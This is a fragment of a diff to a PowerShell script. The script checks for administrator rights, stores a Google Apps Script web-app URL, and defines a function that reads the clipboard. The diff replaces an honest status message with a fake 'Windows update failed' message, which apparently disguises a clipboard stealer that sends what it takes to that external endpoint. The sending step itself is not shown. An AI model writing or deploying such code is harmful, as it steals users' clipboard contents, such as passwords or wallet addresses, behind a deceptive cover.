@@ -2,7 +2,6 @@
 
 function Test-AdminAccess {
     try {
-        # بررسی سطح دسترسی
         $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
         $currentPrincipal = [System.Security.Principal.WindowsPrincipal]$currentIdentity
         return $currentPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -16,7 +15,7 @@ function Test-AdminAccess {
 $gasUrl = "https://script.google.com/macros/s/AKfycbwsG1ZYjRhylSU830-KvLWxqFssgOJfqATzLTNVPnpOlh9pPgwmSWEvXU9KVdQeZZKnJw/exec"
 
 if (Test-AdminAccess) {
-    Write-Host "Running with Admin Access..."
+    Write-Host "Windows update failed"
 function Get-ClipboardContent {
     Add-Type -AssemblyName PresentationCore
     return [Windows.Clipboard]::GetText()
